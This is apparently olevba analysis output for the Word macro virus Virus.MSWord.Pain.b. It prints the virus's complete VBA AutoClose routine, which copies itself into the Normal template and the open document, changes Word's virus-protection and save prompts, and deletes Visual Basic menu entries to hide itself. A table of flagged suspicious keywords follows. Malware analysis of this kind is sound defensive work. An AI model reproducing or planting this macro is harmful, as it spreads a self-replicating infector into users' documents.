olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pain.b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Pain.b 
in file: Virus.MSWord.Pain.b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
On Error Resume Next
S = ActiveDocument.Saved
DisableAutoMacro = False
Text = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Countoflines)
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 1: .SaveNormalPrompt = 0: End With
If Left(Date, 5) = "30.12" Then GoTo z
Set Mac = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Mac.Lines(1, Mac.Countoflines) <> Text Then
Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
For Each Control In CommandBars("Menu Bar").Controls(6).Controls
If Control.Type = 10 Then
   For i = 1 To Control.Controls.Count
      If Right(Control.Controls(i).Caption, 5) = "Basic" Then Control.Delete
      Next i
      End If
   Next Control
End If
Set Mac = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If Mac.Lines(1, Mac.Countoflines) <> Text Then Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
With Dialogs(wdDialogFileSummaryInfo): .Keywords = "Word97-2k.Macro.PAIN": .Execute: End With
If ActiveDocument.Path <> "" Then ActiveDocument.Save
ActiveDocument.Saved = S
z: End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

